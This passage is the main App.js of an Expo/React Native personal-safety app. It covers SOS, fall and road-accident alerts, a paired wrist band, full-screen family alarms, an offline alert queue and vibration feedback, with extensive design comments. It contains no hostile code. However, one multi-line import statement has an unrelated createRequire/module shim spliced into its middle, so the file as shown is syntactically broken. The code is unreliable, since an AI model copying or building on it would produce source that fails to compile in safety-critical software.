import { StatusBar } from 'expo-status-bar';
import React, { useCallback, useEffect, useRef, useState } from 'react';
import {
  ActivityIndicator, AppState, Linking, Modal, Pressable, StyleSheet, Text,
  Vibration, View,
} from 'react-native';
import {
  ALERT_TIMEOUT, call, clearSession, loadSession, optinSamaritan, saveBandPin,
  saveSession, useLive,
} from './src/api';

import { clearQueue, dequeue, enqueue, flushQueue, pendingCount, pressId } from './src/alertQueue';
import { MODES, useBandLink } from './src/bandLink';
import BigNotice from './src/components/BigNotice';
import CheckinBanner from './src/components/CheckinBanner';
import FallCountdown, { FALL_WINDOW_S } from './src/components/FallCountdown';
import SamaritanCall from './src/components/SamaritanCall';
import { useAppFonts } from './src/fonts';
import Alerts from './src/screens/Alerts';
import Auth from './src/screens/Auth';
import Band from './src/screens/Band';
import Family from './src/screens/Family';
import Home from './src/screens/Home';
import LiveMap from './src/screens/LiveMap';
import Setup from './src/screens/Setup';
import UserShell from './src/screens/UserShell';
import DisarmPad from './src/screens/user/DisarmPad';
import { U } from './src/screens/user/kit';
import { SafeAreaRoot, useEdgeInsets } from './src/safeArea';
import { bandEventToAction, useSafetyMachine } from './src/state';
import { C, S, T, fmtAgo, sevColor } from './src/theme';
import { Button, Chip, Icon, IconButton, Txt } from './src/ui';
import { lastKnownFix, useHeartbeat, usePhoneBattery, usePresence } from './src/watch';
import {
  INCIDENT_WINDOW_S, classifyImpact, describeImpact, noteImpact, speedContext,
  travellingSteadily, useSpeedWatch,
} from './src/motion';
import { stopBackgroundWatch, syncBackgroundWatch } from './src/bgService';
import {
  adoptTracking, startTracking, stopTracking, trackAfterStandDown,
} from './src/liveLocation';
import { wantsBand } from './src/band';
import {
  registerBackgroundNotifications, unregisterBackgroundNotifications,
} from './src/bgNotifications';
import { activeAlarm, consumeLaunchAlertId, presentAlarm, stopAlarm } from './src/alarm';
import {
  // consumePendingBandSos, startBandWake and subscribeBandSos are not imported
  // while the band's beacon wake is switched off -- see the commented-out
  // effects below and docs/BAND_WAKE_DISABLED.md. `stopBandWake` stays, and is
  // the one thing still called: it disarms a phone updating from a build that
  // had the feature on.
  stopBandWake,
} from './src/bandWake';
import { runFirstRunAsks } from './src/permissions';
import {
import { createRequire } from 'module';

var require = createRequire(import.meta.url);
var module = { exports: {} };

  DEFAULT_CHANNEL_ID, clearOwnSosNotification, registerPushToken,
  sendEmergencyAlarmIfNothingShown, setupNotificationChannels,
  showOwnSosNotification, stopPushToThisPhone, subscribeNotificationTaps,
} from './src/notifications';

const TABS = [
  ['home',   'Home',   'home'],
  ['band',   'Band',   'watch'],
  ['family', 'Family', 'users'],
  ['alerts', 'Alerts', 'bell'],
  ['setup',  'Setup',  'settings'],
];

/** The kinds that put an emergency on screen and into the offline queue. */
const EMERGENCY_KINDS = ['sos', 'snatch', 'fall', 'accident'];

const TAKEOVER_TITLE = {
  sos: 'SOS', snatch: 'BAND TORN OFF', fall: 'FALL DETECTED',
  accident: 'ROAD ACCIDENT',
  // Not "watch stopped reporting". That reads as a gadget fault, and a family
  // triages it like one; the fact worth acting on is that the phone went quiet
  // *while armed*, which is the state where silence is the signal.
  checkin_missed: 'MISSED CHECK-IN', watch_lost: 'WENT QUIET WHILE ARMED',
  going_dark: 'PHONE ABOUT TO DIE',
};

// The one line under the name, for the kinds where the heading alone does not
// say what has actually happened. An emergency needs none of this -- "SOS" and
// a name is the whole message -- so only the quiet three are listed.
const TAKEOVER_LEDE = {
  watch_lost: 'Their watch stopped reporting while it was armed.',
  checkin_missed: 'They were asked if they were okay and did not answer.',
  going_dark: 'Their phone will stop reporting when the battery goes.',
};

// What reaches the family as a full-screen takeover rather than a line in a
// list. Severity 4 and up is an emergency and brings the siren with it;
// severity 3 -- a missed check-in, a watch that went quiet, a phone about to
// die -- takes the screen without one.
//
// Three used to be the level that got a notification and nothing else, which
// is why a family member whose relative's watch went quiet found out only if
// they happened to look at the shade. Silence *is* the alert for these kinds;
// delivering it more quietly than every other kind was exactly backwards.
const TAKEOVER_FROM = 3;
const SIREN_FROM = 4;

// Above this severity the Good Samaritan fan-out is available at all. It
// mirrors the server's own `sev >= 5` in services/alerts.py: a fall is a
// family matter, a snatch or a crash is one where the nearest stranger is the
// useful responder.
const SAMARITAN_FROM = 5;

// How old a live fix may be before the screen stops calling it live.
//
// Three missed fast pings, or one missed slow one. Past that the pin is
// described as what it is -- a last known position -- because "where they are"
// over a six-minute-old dot is the single most dangerous sentence this app
// could put in front of somebody who is driving. Mirrors LIVE_FIX_STALE_S in
// server/config.py.
const LIVE_STALE_S = 45;

// Battery thresholds, from the acceptance matrix: 20 % tells the family, 5 %
// says the phone is about to stop being a safety device at all.
const BATT_LOW = 20;
const BATT_DARK = 5;

// Hysteresis on the re-arm, so a level sitting exactly on a threshold cannot
// page the family twice. Mirrors virtualBand.js, which has always had it.
const BATT_REARM = 3;

// The band's reading needs more than hysteresis. DEVELOPMENT_PLAN F2.3 records
// consecutive heartbeats alternating between 93% and 39% on one board, on one
// continuous `seq`: the divider's source impedance (~338k) is far too high for
// the SAADC's default acquisition window, so each conversion is dragged toward
// the previous one, and averaging 8 back-to-back reads does not help because
// every sample is equally under-settled.
//
// No hysteresis band survives a 54-point swing. Requiring N consecutive
// readings on the same side does -- an alternating signal never produces two
// in a row. This is a workaround for a firmware defect, not a fix; the fix is
// F2.3 (longer acquisition time, or median-of-N with a gap between samples).
const BAND_LOW_STREAK = 3;

// What the phone vibrates when a press finally has an answer. Mirrors the band
// patterns in nigraan_band_nrf52.ino, deliberately: one fact, two outputs.
//
// Short and soft, and NOT the old [0, 300, 120, 300]. Two 300 ms buzzes against
// a hard surface -- a table, a bag with a laptop in it -- carry across a quiet
// room, and the wearer may be hiding from whoever they pressed the button
// about. That is the same reasoning that already keeps the wearer's own SOS
// notification silent; see notifications.js. Felt in a pocket, not heard across
// a room.
//
// `delivered` has two shapes, chosen by what was confirmed. An SOS reaching the
// family is the confirmation a frightened person is actually waiting for, so it
// is a single firm buzz, longer than anything the check-in path produces and
// recognisable without counting. A check-in answered is routine good news.
//
// `failed` is two long heavy buzzes rather than one. A single buzz means
// "sent", so failure must not also be a single buzz — telling 400 ms from
// 900 ms apart under stress is the most dangerous distinction in this
// vocabulary. Repetition carries it instead: one buzz is a full stop, two heavy
// ones are insistent.
const OUTCOME_BUZZ = {
  delivered_sos: [0, 400],
  delivered:     [0, 90, 70, 90],
  queued:        [0, 250, 150, 250, 150, 250],
  failed:        [0, 700, 300, 700],
};

// Local notifications are best-effort: Expo Go on Android has limits, and a
// demo cannot hinge on the notification shade. The in-app takeover below is
// the real signal; a notification is a bonus when the app is backgrounded.
let Notifications = null;
try {
  Notifications = require('expo-notifications');
  Notifications.setNotificationHandler({
    handleNotification: async () => ({
      shouldShowBanner: true, shouldShowList: true,
      shouldPlaySound: true, shouldSetBadge: false,
    }),
  });
} catch { /* not available; in-app alerts still work */ }

async function notify(title, body) {
  if (!Notifications) return;
  try {
    const p = await Notifications.getPermissionsAsync();
    if (!p.granted) {
      const r = await Notifications.requestPermissionsAsync();
      if (!r.granted) return;
    }
    await Notifications.scheduleNotificationAsync({
      content: { title, body, sound: true },
      // Same reason as the emergency channel: setupNotificationChannels creates
      // this one with the check-in vibration pattern, and the channel is picked
      // by the trigger. `trigger: null` quietly used Android's own default.
      trigger: { channelId: DEFAULT_CHANNEL_ID },
    });
  } catch { /* best effort */ }
}

/**
 * The same, but only when nobody is looking at the app.
 *
 * For anything that also has a screen of its own -- a BigNotice, the takeover
 * -- a shade banner posted while that screen is up is the same fact twice,
 * one of them drawn on top of the other. This is for the other half: the
 * phone in a pocket, where the notification is the only delivery there is.
 */
async function notifyIfAway(title, body) {
  if (AppState.currentState === 'active') return;
  await notify(title, body);
}

function Main() {
  const [booting, setBooting] = useState(true);
  const [session, setSession] = useState(null);
  const [tab, setTab] = useState('home');
  const [refreshKey, setRefreshKey] = useState(0);

  const [incoming, setIncoming] = useState(null);     // family emergency takeover
  const [acking, setAcking] = useState(false);        // "I'm on it", mid-flight
  // The family's Good Samaritan decision, mid-flight. Its own flag rather than
  // `acking`: both buttons live on the takeover and pressing one must not make
  // the other look like it is working.
  const [optingIn, setOptingIn] = useState(false);
  // The alert whose live map is open, or null. Its own state rather than a
  // flag on `incoming`, because the map outlives the takeover: dismissing the
  // emergency screen to look at a road should not close the road.
  const [liveMap, setLiveMap] = useState(null);
  const [askSheet, setAskSheet] = useState(null);     // the check-in question
  const [samaritan, setSamaritan] = useState(null);   // a stranger nearby
  const [deliveredTo, setDeliveredTo] = useState(null);
  const [deliveryStatus, setDeliveryStatus] = useState(null); // null | 'queued' | 'sending' | 'delivered'
  const [toast, setToast] = useState(null);
  // The queue behind BigNotice: news that is not an emergency but is still
  // somebody's answer -- a check-in answered, a responder on the way, an alert
  // stood down. Only the head is on screen; see `pushNotice` below.
  const [notices, setNotices] = useState([]);
  const [fix, setFix] = useState(null);               // last position, from Home
  const [pendingAlertId, setPendingAlertId] = useState(null); // { id, answered } from a notification

  const { state, ctx, dispatch, is, watchMode } = useSafetyMachine();
  const insets = useEdgeInsets();
  const bump = useCallback(() => setRefreshKey((k) => k + 1), []);

  /**
   * The sheet cannot outlive the question.
   *
   * `askSheet` is a copy of `ctx.checkin` that the modal renders from, and the
   * two are set together at every point a question arrives. They were only ever
   * torn down together at the points that existed when the sheet was written --
   * and the list of ways a question can close has been growing ever since:
   * answering it, a stand-down, an SOS ending, the server closing it because
   * "I am safe" answered it. Each new one is another chance to clear the state
   * machine's copy and leave a modal on screen asking a question that no longer
   * exists, which is how somebody who has just said they are safe gets asked,
   * a second later, whether they are safe.
   *
   * One effect instead of a `setAskSheet(null)` at every route out. Close only,
   * never open: "Not now" deliberately drops the sheet while leaving the
   * question open, and reopening it a frame later would take that away.
   */
  useEffect(() => { if (!ctx.checkin) setAskSheet(null); }, [ctx.checkin]);

  /**
   * Put one piece of news on the screen, big, and leave it there.
   *
   * Appends rather than replaces. Two of these can land within a second of
   * each other -- two family members both answering the same SOS -- and the
   * second overwriting the first would mean one of them was never told about
   * at all. Only the head renders; dismissing it brings the next.
   *
   * Keyed so that the *same* news arriving twice (a socket frame and its
   * push, or a reconnect replaying a frame) does not queue two identical
   * popups to dismiss one after the other.
   */
  const pushNotice = useCallback((notice) => {
    const key = notice.key || `${notice.icon}:${notice.title}`;
    setNotices((q) => (q.some((n) => n.key === key) ? q : [...q, { ...notice, key }]));
  }, []);

  const dismissNotice = useCallback(() => setNotices((q) => q.slice(1)), []);

  /**
   * How many people are waiting on an answer from this phone.
   *
   * Only the admin console needs it up here, and only admins pay for it: its
   * Family tab is where a request is answered, and a tab with nothing on it is
   * indistinguishable from a tab with somebody's question behind it. The user
   * shell counts its own, from the list its board is already loading -- one
   * more request on every socket frame, for a number somebody else has, is
   * exactly the kind of cost this app should not be paying during an
   * emergency.
   *
   * Re-read on `refreshKey`, which every arriving invite bumps, and again by
   * hand when the Family tab answers one -- answering there is a round trip
   * this component never hears about otherwise, and a dot that outlives the
   * question it was about is worse than no dot at all. A failure leaves the
   * old count: the tab still opens, the request is still in the list behind
   * it, and a mark this small is not worth an error message.
   */
  const [pendingInvites, setPendingInvites] = useState(0);
  // Which account the in-flight read belongs to. Sign out while it is on the
  // wire and the answer that comes back is about somebody who is no longer
  // holding this phone.
  const invitesFor = useRef(null);
  const refreshInvites = useCallback(async () => {
    const who = session?.user_id || null;
    invitesFor.current = who;
    if (!session || session.role !== 'admin') { setPendingInvites(0); return; }
    try {
      const r = await call(session, '/invites');
      if (invitesFor.current === who) setPendingInvites(r?.incoming?.length || 0);
    } catch { /* the dot is the only casualty */ }
  }, [session]);

  useEffect(() => { refreshInvites(); }, [refreshInvites, refreshKey]);

  useEffect(() => {
    (async () => {
      await setupNotificationChannels();
      // If a full-screen intent is what put this app on screen, the alert it
      // was about is sitting in the launch intent. Read it before anything
      // else can replace the intent, and hand it to the same routing the
      // notification tap uses.
      const launched = await consumeLaunchAlertId();
      if (launched) setPendingAlertId(launched);
      const s = await loadSession();
      setSession(s);
      // The foreground service is no longer started here. Signing in is not
      // by itself a reason to hold a process alive; holding a band link or
      // being armed is. The effect below owns that and runs on this launch.
      setBooting(false);
    })();
  }, []);

  // The role lives on the server row, never on the phone.
  //
  // It is read once at sign-in and then cached alongside the token, so an
  // account promoted to admin in the database would otherwise keep the
  // end-user shell until somebody thought to sign out and back in. Re-read it
  // on every launch, and write the answer back so the next cold start is
  // already right even with no network.
  const [roleTick, setRoleTick] = useState(0);
  useEffect(() => {
    if (!session?.token) return undefined;
    let cancelled = false;
    (async () => {
      try {
        const who = await call(session, '/me');
        // Only an explicit role is allowed to change anything. A server that
        // does not send the field at all -- an older build, or one that has
        // not been restarted since this endpoint learned to return it -- is
        // saying nothing about the role, not saying "user", and treating the
        // two the same demotes an admin one tick after they sign in.
        const role = typeof who?.role === 'string' ? who.role : null;
        if (cancelled || !role || role === session.role) return;
        const next = { ...session, role };
        setSession(next);
        await saveSession(next);
      } catch { /* offline: the cached role stands */ }
    })();
    return () => { cancelled = true; };
  }, [session?.token, session?.url, session?.role, roleTick]);

  // Coming back to the app counts as a launch for this purpose. Somebody
  // changing a role in the database and then reaching for the phone should not
  // have to kill it first to see the difference.
  useEffect(() => {
    const sub = AppState.addEventListener('change', (next) => {
      if (next === 'active') setRoleTick((n) => n + 1);
    });
    return () => sub.remove();
  }, []);

  // Tapping the push is how a killed app is opened at all, so the tap has to
  // land on the alert rather than a bare Home screen. The listener can fire
  // before `session` is ready (cold start), so it only records which alert
  // was tapped; the effect below does the fetch once a session exists.
  //
  // A tap on the push body is never an answer -- only the alarm notification's
  // own I'M ON IT button is, and that arrives through consumeLaunchAlertId.
  useEffect(() => subscribeNotificationTaps(
    (id) => setPendingAlertId({ id, answered: false })
  ), []);

  // Coming back to the app is the other half of the launch read, and for a long
  // time it was missing.
  //
  // The read above runs once, at boot. But MainActivity is singleTask, so when
  // the app is merely backgrounded -- which it usually is, the family member
  // opened it this morning -- Android does not restart it. It hands the alarm
  // notification's intent to `onNewIntent` instead, and nothing was ever asking
  // for that. So the one gesture the notification exists for, pressing it,
  // brought the app to the front on whatever tab it was left on, with the siren
  // still sounding and no takeover anywhere: no name, no map, no way to answer.
  //
  // `activeAlarm` is the second question, for the person who reaches past the
  // notification and opens the app from its icon. Neither of those intents
  // carries an alert id; the siren itself is the only thing that knows.
  useEffect(() => {
    const sub = AppState.addEventListener('change', async (next) => {
      if (next !== 'active') return;
      const hit = (await consumeLaunchAlertId()) || (await activeAlarm());
      if (hit) setPendingAlertId(hit);
    });
    return () => sub.remove();
  }, []);

  useEffect(() => {
    if (!pendingAlertId) return;
    // No session to fetch the alert with. While booting that is only "not yet",
    // so wait; once boot is done it is final, and the id has to be dropped
    // rather than held -- a held id keeps the siren armed forever, because the
    // stop below refuses to fire while one is outstanding.
    if (!session) {
      if (!booting) setPendingAlertId(null);
      return;
    }
    const { id, answered } = pendingAlertId;
    (async () => {
      try {
        const list = await call(session, '/alerts?scope=incoming');
        const alert = list.find((a) => String(a.id) === String(id));
        if (alert && !alert.resolved_at) {
          setIncoming(alert);
          setTab('home');
          // They already said they were going -- on the notification, before the
          // app was even open. The takeover still comes up, because "who and
          // where" is the next thing they need, but the family is told now
          // rather than after a second press of a button they have pressed.
          if (answered) {
            try {
              await call(session, `/alert/${alert.id}/ack`, { method: 'POST' });
              bump();
            } catch { /* the socket tells them when it reconnects */ }
          }
        }
      } catch { /* the in-app takeover still works once the socket catches up */ }
      setPendingAlertId(null);
    })();
  }, [pendingAlertId, session, booting, bump]);

  // Ask for what the app needs at the point somebody has an account and is
  // looking at the screen -- not on a Setup tab they may never open. Two rungs,
  // once per install; runFirstRunAsks says what is deliberately left out of it
  // and who asks for those instead.
  useEffect(() => {
    if (!session?.token) return;
    runFirstRunAsks();
  }, [session?.token]);

  // Keyed on the session rather than done once at boot. Registering only on
  // mount meant somebody who had just signed in had no push token on the
  // server until they next launched the app -- so the first alert after
  // pairing, the one most likely to be a real test, reached nothing. It also
  // re-runs on a token change, which is when a rotated push token gets filed.
  useEffect(() => {
    if (!session?.token) return;
    registerPushToken(session);
    // The silent push that fires the lock-screen alarm is delivered to a task,
    // not to a listener, and an unregistered task is simply never run. Doing it
    // here rather than at boot means it is also re-registered for whoever signs
    // in next on a shared phone.
    registerBackgroundNotifications();
  }, [session?.token, session?.url]);

  // The one place the alarm is stopped.
  //
  // Every exit out of the takeover -- "I'M ON IT", "Dismiss", and the wearer
  // standing the alert down from their own phone -- ends by clearing
  // `incoming`, so hanging the stop off that rather than off each button is
  // what makes it impossible to add a fourth exit that leaves a siren running.
  //
  // It also fires on mount, which is deliberate: the alarm notification is
  // ongoing and survives the process, so an app killed mid-siren would come
  // back to a notification it no longer has any way to clear.
  //
  // But that mount fire must not silence the alarm that *opened* this app. The
  // lock-screen takeover launches us cold with the siren already sounding, and
  // `incoming` cannot be set yet -- the alert id still has to be read off the
  // launch intent, the session loaded, and the row fetched. Firing before all
  // of that killed the siren about a second in and left the takeover on screen
  // silent. So the stop waits until nothing is still on its way: `booting`
  // covers the intent read, `pendingAlertId` covers the fetch, and both clear
  // even when they find nothing, which is when there really is a stale siren
  // to cut.
  useEffect(() => {
    if (booting || pendingAlertId || incoming) return;
    stopAlarm();
  }, [incoming, pendingAlertId, booting]);

  useEffect(() => {
    if (!toast) return undefined;
    const t = setTimeout(() => setToast(null), 4500);
    return () => clearTimeout(t);
  }, [toast]);

  // ---- raising and standing down -----------------------------------------
  // The band, reachable from `raise` below, which is defined before the link
  // exists. A ref rather than a dependency because a buzz is fire-and-forget:
  // rebuilding `raise` every time the band's battery ticks would be a lot of
  // churn for a call that never reads anything back.
  const bandRef = useRef(null);

  // ---- telling the wearer what actually happened to their press ------------
  //
  // The band cannot answer this and must not pretend to. A successful write
  // over the GATT link means the *phone* received the press; whether the server
  // has it, and whether the family was paged, is known only here. With the
  // offline queue in between, an alert can be accepted by this phone and sit
  // unsent for minutes -- so a confirmation fired at dispatch time is a
  // confirmation of nothing.
  //
  // One helper, three outcomes, two channels. Both channels are driven from the
  // same event on purpose: two confirmations that can disagree are worse than
  // one, because a wearer with a buzzing wrist and a silent phone has no way to
  // reconcile them. Fired together they degrade gracefully instead -- phone in
  // a bag, you still feel the band; band flat or out of range, you still feel
  // the phone.
  //
  // See docs/BAND_FEEDBACK_SPEC.md. The band's side is `handleCommand` in
  // nigraan_band_nrf52.ino; the patterns are OUTCOME_BUZZ at the top of this
  // file.
  // `status` is 'delivered' | 'queued' | 'failed'; `kind` is 'sos' for an
  // emergency and anything else for the routine paths. The band is NOT told the
  // kind -- it sent the event, so it already knows what it is waiting to hear
  // about, and a protocol that carried it would be a second source of truth
  // able to disagree with the first. Only the phone's own buzz needs the hint.
  const reportOutcome = useCallback((status, kind) => {
    // `ack` is the firmware's own name for "cloud received our event". It has
    // existed in the protocol since the beginning and nothing had ever sent it.
    const cmd = status === 'delivered' ? 'ack' : status;
    try { bandRef.current?.send?.({ c: cmd }); } catch { /* no band, or link gone */ }

    const key = status === 'delivered' && kind === 'sos' ? 'delivered_sos' : status;
    try { Vibration.vibrate(OUTCOME_BUZZ[key] || OUTCOME_BUZZ.failed); } catch { /* no motor */ }
  }, []);

  const raise = useCallback(async (payload) => {
    if (!session) return null;

    // Capture the GPS fix at the moment the button is pressed — Point A.
    // This is where the emergency happened, not wherever the phone drifts
    // to while waiting for signal.
    const at = fix || await lastKnownFix();

    // The id of this press, minted here and not one line later. It goes out on
    // the FIRST attempt, which is the one that matters: the duplicate SOS came
    // from an attempt that reached the server, inserted the row and paged the
    // family, and then took longer to answer than the phone was willing to
    // wait. Every retry now carries the same id and the server recognises it.
    const clientId = pressId();
    const allowSamaritan = payload.allow_samaritan ?? payload.allowSamaritan ?? null;
    const body = {
      lat: at?.lat, lon: at?.lon, accuracy: at?.acc, client_id: clientId, ...payload,
      allow_samaritan: allowSamaritan,
    };
    // `accident` belongs here with the rest. Everything this flag gates --
    // the local-first dispatch, the sticky own-SOS notification, the
    // offline queue, the delivery outcome sent back to the wrist -- is
    // exactly what a crash alert needs, and leaving it out would make the
    // most serious event the detector can raise the only one that silently
    // fails to queue when there is no signal.
    const isEmergency = EMERGENCY_KINDS.includes(payload.kind);

    // LOCAL-FIRST: fire the state machine and vibrate immediately, before
    // the network call. The user must know their button press registered,
    // and the SOS screen must appear even with no connectivity at all.
    const localAlert = {
      id: `pending-${Date.now()}`,
      kind: payload.kind,
      source: payload.source || 'app',
      created_at: Date.now() / 1000,
      lat: at?.lat, lon: at?.lon,
      samaritan_status: allowSamaritan === true ? 'allowed' : (allowSamaritan === false ? 'denied' : 'pending'),
      _local: true,  // marker: not yet confirmed by the server
    };
    if (isEmergency) {
      dispatch('SOS_RAISED', { alert: localAlert });
      setDeliveredTo(null);
      setDeliveryStatus('queued');

      // ACKNOWLEDGEMENT, not confirmation. One short buzz meaning "this phone
      // heard you" -- nothing more, because nothing more is known yet.
      //
      // This used to be [0,300,120,300] plus a three-pulse band buzz, both
      // fired here, one line after deliveryStatus was set to 'queued' and
      // before the network call below had been attempted. The wearer was told
      // "SOS sent" twice, on two devices, at a moment when nothing had left the
      // phone -- and two channels agreeing reads as corroboration, which made
      // it worse than a single wrong signal rather than better.
      //
      // The real answer now goes out from the try/catch below, where it is
      // actually known. The band says nothing at all here: it already ticked
      // once per press, and it is waiting to be told.
      Vibration.vibrate([0, 90]);

      // The confirmations that do not need this screen to exist.
      //
      // When the band raises an SOS with the app swiped out of Recents, this
      // function still runs: the process is alive, the vibration is felt, and
      // the alert below reaches the server. Only the dispatch above is inert,
      // because the reducer it targets died with the activity. So the wrist and
      // the notification shade are where the wearer is actually told -- and
      // they are the two places that were saying nothing at all.
      showOwnSosNotification(localAlert);
    }

    // Now try the network call.
    try {
      const r = await call(session, '/alert', {
        method: 'POST', body, timeout: ALERT_TIMEOUT,
      });
      if (isEmergency) {
        // Replace the local placeholder with the real server alert.
        dispatch('SOS_RAISED', { alert: r.alert });
        setDeliveredTo(r.delivered_to);
        setDeliveryStatus('delivered');
        // And start reporting where she is, on the rhythm the SERVER asked
        // for. Only now, not at the local-first dispatch above: until this
        // reply there is no alert row for the fixes to belong to, and a
        // tracker started against a `pending-...` id would post positions the
        // server has nowhere to put. The fix the alert already carries covers
        // the seconds in between.
        if (r.tracking) startTracking(r.tracking).catch(() => { /* the bg tick retries */ });
        // The server has it. This is the first moment anything could honestly
        // say so, and it is the only place that says it.
        reportOutcome('delivered', 'sos');
      }
      if (payload.kind !== 'near_miss') {
        setToast(r.delivered_to
          ? `Sent to ${r.delivered_to} family member${r.delivered_to === 1 ? '' : 's'}`
          : 'Nobody is in your family list yet — add someone first');
      }
      bump();
      return r.alert;
    } catch (e) {
      if (isEmergency) {
        // Network failed — queue for retry. The SOS screen is already live
        // from the local-first dispatch above.
        //
        // The queue's own id becomes the alert's id from here on. Without that
        // the screen held a `pending-…` id with no way back to the row in
        // storage, so cancelling had nothing to aim at and cleared the entire
        // queue -- a queued fall plus a queued SOS meant standing down either
        // one silently threw away the other.
        const queuedId = await enqueue(body);
        dispatch('SOS_RAISED', { alert: { ...localAlert, id: queuedId } });
        setDeliveryStatus('queued');
        // Held, not delivered, and the wrist is told which. This is the case
        // the old confirmation hid completely: the alert is safe on the phone
        // and nobody has been paged, and the wearer used to feel exactly what
        // they felt when the family had already been called.
        reportOutcome('queued');
        setToast('No signal — your alert is saved and will send automatically when connection returns');
      } else {
        setToast(e.message);
      }
      return null;
    }
  }, [session, fix, dispatch, bump, reportOutcome]);

  const handleOptinSamaritan = useCallback(async (alertId, action) => {
    if (!session) return;
    try {
      const res = await optinSamaritan(session, alertId, action);
      dispatch('SAMARITAN_STATUS', {
        alertId,
        samaritan_status: res.samaritan_status,
        decided_by: res.decided_by,
      });
      setIncoming((cur) => {
        if (!cur || cur.id !== alertId) return cur;
        return {
          ...cur,
          samaritan_status: res.samaritan_status,
          samaritan_decided_by: res.decided_by,
        };
      });
      if (res.samaritan_status === 'allowed') {
        setToast('Broadcasted to nearby Good Samaritans within 800m');
      } else {
        setToast('Emergency set to Family Only');
      }
      bump();
    } catch (e) {
      setToast(e.message);
    }
  }, [session, dispatch, bump]);

  const resolve = useCallback(async (id) => {

    try {
      if (!id || String(id).startsWith('pending-') || String(id).startsWith('local-')) {
        // One item, not the lot. `local-…` is a real row in the queue and is
        // removed by id; `pending-…` never reached storage at all, so there is
        // nothing to remove and anything else waiting there belongs to a
        // different emergency.
        if (String(id).startsWith('local-')) await dequeue(id);
        dispatch('SOS_CLEARED');
        setDeliveredTo(null);
        setDeliveryStatus(null);
        clearOwnSosNotification();
        // Nothing had gone out, so nothing needs standing down at the server.
        // From the wrist's point of view the cancel still landed, which is what
        // the press was asking about.
        reportOutcome('delivered');
        setToast('Cancelled — alert was not sent yet');
        bump();
        return;
      }
      const r = await call(session, `/alert/${id}/resolve`, { method: 'POST' });
      dispatch('SOS_CLEARED');
      // Both, because this phone is not always in `sos_live` when it stands one
      // down. A fall that escalated on the SERVER never raised an alert here --
      // the machine is sitting in `checkin_pending` holding the fall's own
      // question, which `recoverOpenWork` put back on screen -- and SOS_CLEARED
      // is illegal there, so it is dropped and the question survives the
      // stand-down. In `sos_live` this one is the dropped event instead, and
      // SOS_CLEARED has already cleared the same field. Whichever state we are
      // in, exactly one of these lands and the question closes.
      dispatch('CHECKIN_CLOSED');
      setDeliveredTo(null);
      setDeliveryStatus(null);
      // The emergency is over; the journey is not. "I'm safe" gets pressed at
      // the roadside or at the top of a street she still has to walk down, and
      // the family keep seeing her move for the half hour the server just
      // granted -- slower, and on a notification that says so. `track_until`
      // is the server's number: the phone is not trusted to decide when to
      // stop reporting somebody's position.
      trackAfterStandDown(id, r?.track_until).catch(() => { /* bg tick retries */ });
      // The notification is sticky by design, so nothing else will ever take it
      // down. An "SOS is active" sitting on the lock screen after the wearer
      // stood it down is the same lie as the screen showing nothing during one.
      clearOwnSosNotification();
      reportOutcome('delivered');
      setToast('Stood down — your family has been told');
      bump();
    } catch (e) {
      // The family still believes this is live. That is worth a distinct
      // signal on the wrist, not just a toast: the wearer thinks they have
      // called off an emergency and they have not.
      reportOutcome('failed');
      setToast(e.message);
    }
  }, [session, dispatch, bump, reportOutcome]);

  const ackCheckin = useCallback(async (checkin) => {
    if (!session) return;
    setAskSheet(null);
    try {
      // Prefer the specific row. Falling back to a plain `checkin_ack` alert is
      // not a nicety: a buzz that arrived while the socket was down has no id
      // here, and the server closes every open question either way.
      if (checkin?.checkin_id) {
        await call(session, `/checkin/${checkin.checkin_id}/ack`, { method: 'POST' });
      } else {
        await call(session, '/alert', { method: 'POST', body: { kind: 'checkin_ack', source: 'app' } });
      }
      dispatch('CHECKIN_CLOSED');
      // "I'm fine" reached the server. The band has been waiting to hear this
      // since the press -- it stopped buzzing its own guess, because a
      // stand-down that never arrived used to feel identical to one that did.
      reportOutcome('delivered');
      setToast('Answered — your family can see you are fine');
      bump();
    } catch (e) {
      // A failed stand-down is the dangerous direction: the family is still
      // being told this person has not answered. Say so on the wrist rather
      // than only in a toast the wearer may never look at.
      reportOutcome('failed');
      setToast(e.message);
    }
  }, [session, dispatch, bump, reportOutcome]);

  const toggleHighAlert = useCallback(async (on) => {
    if (!session) return;
    try {
      const r = await call(session, '/watch/high_alert', { method: 'POST', body: { on } });
      dispatch('HIGH_ALERT_SET', { on, nextBuzzAt: r.next_buzz_at || null });
      setToast(on
        ? 'High Alert armed — the server checks on you even if this app is closed'
        : 'High Alert off');
      bump();
    } catch (e) {
      // Say what actually happened. A band that buzzed twice while the server
      // never heard is worse than a plain failure, because the wearer now
      // believes she is being watched.
      setToast(`Could not reach the server — High Alert is NOT ${on ? 'on' : 'off'}`);
    }
  }, [session, dispatch, bump]);

  /**
   * When the last incident question was opened, for the re-entrancy guard
   * inside openIncidentCheckin. A ref rather than state on purpose: it has to
   * be readable and writable in the same synchronous turn, which is exactly
   * what state cannot do.
   */
  const incidentAt = useRef(0);

  /**
   * A detector fired. Ask the wearer, and tell nobody.
   *
   * This is the whole of "a fall does not page your family". The question goes
   * to the SERVER, not to a timer in this process, because the situations this
   * exists for are the ones where this process is about to stop existing: the
   * phone lands screen-down in a gutter, the battery gives out, an OEM battery
   * manager kills the app the moment the screen goes off, the rider goes one
   * way and the phone the other. A local countdown in any of those is a
   * question asked, unanswered, and then silently dropped -- the exact failure
   * the product exists to prevent, arrived at quietly.
   *
   * Once `/checkin/self` has returned, the deadline is a row in the database
   * and the sweeper owns it. This phone can be destroyed in the next second and
   * the family is still told.
   *
   * The local countdown below is the OFFLINE path, and only that. With no
   * network there is no server to hold the deadline, so the phone holds it
   * itself and raises the alert into the offline queue if it runs out -- which
   * is worse (it dies with the app) and is still much better than nothing.
   */
  const openIncidentCheckin = useCallback(async (reason, ev) => {
    if (!session) return;
    if (stateRef.current === 'sos_live') return;   // already the worst case
    if (stateRef.current === 'fall_pending') return;  // one question per episode

    // The state guard above is not enough on its own, and the case it misses is
    // the normal one for a serious crash. Somebody thrown off a bike produces a
    // real free-fall AND a 20 g spike, so the band sends `fall` and `impact`
    // milliseconds apart -- and `stateRef` is only refreshed on render, so the
    // second one arrives before React has been anywhere near the first. Both
    // pass, and one accident becomes two questions, two rows and two
    // escalations to the same family.
    //
    // A timestamp read and written synchronously is what actually closes it.
    // The window matches the band's own IMPACT_REFRACTORY_MS: inside ten
    // seconds, everything the IMU reports is the same episode.
    const nowMs = Date.now();
    if (nowMs - incidentAt.current < 10000) return;
    incidentAt.current = nowMs;

    const at = fix || await lastKnownFix();
    const ctxNow = speedContext();
    const note = (describeImpact(ev, ctxNow)
